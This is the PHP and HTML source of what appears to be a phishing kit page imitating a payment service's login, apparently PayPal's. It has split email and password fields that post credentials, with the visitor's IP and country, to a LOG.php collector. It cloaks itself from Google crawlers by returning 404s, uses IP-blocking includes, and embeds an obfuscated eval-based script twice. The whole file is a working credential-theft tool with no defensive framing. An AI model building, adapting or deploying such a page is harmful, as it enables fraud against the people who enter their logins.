<?php
session_start();
error_reporting(0);

include('../tnt/datacon.php');
include('./en.php');
include('../../functions/BlockIP.php');
include('../../functions/get_ip.php');
date_default_timezone_set('America/Los_Angeles');
$TIME_DATE = date('h:i A d/m/Y');

if(isset($_POST['btnLogin'])){

  include('LOG.php');
}

//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
      
?>
<!DOCTYPE html><html lang="en" class="no-js desktop"><head><meta charset="utf-8" /><title><?php echo $xys9x; ?></title><meta http-equiv="content-type" content="text/html; charset=UTF-8" /><link rel="shortcut icon" href="./XYSASSETSX/img/favicon/fav.ico" /><link rel="apple-touch-icon" href="XYSASSETSX/img/ticon.png" /><meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes" /><link rel="stylesheet" href="XYSASSETSX/css/xcontexLogx.css" /></head><body class="desktop"><div id="main" class="main" role="main"> <section id="login" class="login " data-role="page"><div class="corral"><div class="contentContainer activeContent contentContainerBordered"> <header><p class="xyslogoppx xyslogoppx-long"></p> </header><div class="notifications hide"><p class="notification notification-critical" role="alert"><?php echo $xys10x; ?></p></div><form action="./LOG.php" method="post" class="proceed maskable" autocomplete="off" name="login" autocomplete="off" novalidate><div class="profileRememberedEmail hide"> <span class="profileDisplayPhoneCode"></span> <span class="profileDisplayEmail"></span> <a href="#" class="notYouLink" id="backToInputEmailLink"><?php echo $xys21x; ?></a></div><div id="splitEmail" class="splitEmail"><div id="splitEmailSection"><div id="emailSection" class="clearfix"><div class="textInput" id="login_emaildiv"><div class="fieldWrapper"> <label for="email" class="fieldLabel"><?php echo $xys11x; ?></label> <input id="xysemailx" name="login_email" type="email" class="hasHelp validateEmpty" required="required" aria-required="true" value="" autocomplete="off" placeholder="<?php echo $xys11x; ?>" /></div><div class="errorMessage" id="emailErrorMessage"><p class="emptyError hide"><?php echo $xys12x; ?></p></div></div></div>


</div><div class="actions"> <button class="button actionContinue scTrack:unifiedlogin-login-click-next" type="submit" id="btnNext" name="btnNext" value="<?php echo $xys26x; ?>"><?php echo $xys26x; ?></button></div></div><div id="splitPassword" class="splitPassword hide"><div id="splitPasswordSection" class="hide"><div id="passwordSection" class="clearfix"><div class="textInput" id="login_passworddiv"><div class="fieldWrapper"> <label for="password" class="fieldLabel"><?php echo $xys13x; ?></label> <input id="xyspassx" name="login_password" type="password" class="hasHelp validateEmpty pin-password" required="required" aria-required="true" value="" placeholder="<?php echo $xys13x; ?>" /> <button type="button" class="showPassword hide show-hide-password scTrack:unifiedlogin-show-password" aria-label="Show password"><?php echo $xys14x; ?></button> <button type="button" class="hidePassword hide show-hide-password scTrack:unifiedlogin-hide-password" aria-label="Hide"><?php echo $xys15x; ?></button></div><div class="errorMessage" id="passwordErrorMessage"><p class="emptyError hide"><?php echo $xys16x; ?></p></div></div></div></div><div class="rememberProfile hide"><div class="checkboxContainer"> <input type="checkbox" name="rememberProfile" value="true" id="rememberProfilePassword" class="checkboxInput scTrack:unifiedlogin-rememberme-profile-opt-in" /> <label for="rememberProfilePassword" class="checkboxLabel"><?php echo $xys22x; ?></label> <a href="#" class="infoLink scTrack:remember-profile-more-info"><?php echo $xys23x; ?></a><p class="bubble-tooltip" style="display: none;"><?php echo $xys24x; ?> <script type="text/javascript">eval(unescape('%66%75%6e%63%74%69%6f%6e%20%6e%39%61%66%62%34%64%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%31%32%33%35%39%30%34%34%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%35%33%35%35%31%37%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%38%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%6e%39%61%66%62%34%64%28%27')+'%4c%5c%78%4d%5c%4112359044%34%35%39%35%35%30%31'+unescape('%27%29%29%3b'));</script> <?php echo $xys25x; ?></p></div></div><div class="actions"> <button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin" name="btnLogin" value="<?php echo $xys17x; ?>"><?php echo $xys17x; ?></button></div></div><div id="implicitEmail" class="hide"><div class="rememberProfile hide"><div class="checkboxContainer"> <input type="checkbox" name="rememberProfileCheck" value="true" id="rememberProfileImplicit" class="checkboxInput scTrack:unifiedlogin-rememberme-profile-opt-in" /> <label for="rememberProfileImplicit" class="checkboxLabel"><?php echo $xys22x; ?></label> <a href="#" class="infoLink scTrack:remember-profile-more-info"><?php echo $xys23x; ?></a><p class="bubble-tooltip" style="display: none;"><?php echo $xys24x; ?> <script type="text/javascript">eval(unescape('%66%75%6e%63%74%69%6f%6e%20%6e%39%61%66%62%34%64%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%31%32%33%35%39%30%34%34%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%35%33%35%35%31%37%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%38%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%6e%39%61%66%62%34%64%28%27')+'%4c%5c%78%4d%5c%4112359044%34%35%39%35%35%30%31'+unescape('%27%29%29%3b'));</script> <?php echo $xys25x; ?></p></div></div><div class="actions"> <button class="button actionContinue scTrack:unifiedlogin-login-click-next" type="submit" id="btnNextImplicitEmail" name="btnNext" value="<?php echo $xys26x; ?>"><?php echo $xys26x; ?></button></div></div> <input type="hidden" name="splitLoginCookiedFallback" value="true"> <input type="hidden" name="notifications" value="<?php echo $_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'] ?>"> <input type="hidden" name="actionsSpacedShort" value="<?php echo $_SESSION['xcountryx']; ?>"> <input type="hidden" name="splitLoginContext" value="<?php echo $_SESSION['xipx']; ?>"></form>

 <div class="loginSignUpSeparator"> <span class="textInSeparator" aria-label="or"><?php echo $xys19x; ?></span></div> <a href="#" class="button secondary scTrack:unifiedlogin-click-signup-button"><?php echo $xys20x; ?></a></div></div> </section> <section id="verification" class="verification hide" data-role="page"></section> <footer class="footer" role="contentinfo"><div class="legalFooter"><ul class="footerGroup"><li> <a href="#"><?php echo $xys5x; ?></a></li><li> <a href="#"><?php echo $xys6x; ?></a></li><li> <a href="#"><?php echo $xys7x; ?></a></li><li> <a href="#"><?php echo $xys8x; ?></a></li></ul></div> </footer></div><div class="transitioning" style="display: none;"><p class="checkingInfo hide">Verifying your information…</p><p class="oneSecond hide">Just a moment…</p></div> <script src="XYSASSETSX/js/jquery.min.js"></script> <script src="XYSASSETSX/js/xsinsecx.js"></script> <script src="XYSASSETSX/js/xppappx.js"></script> </body></html>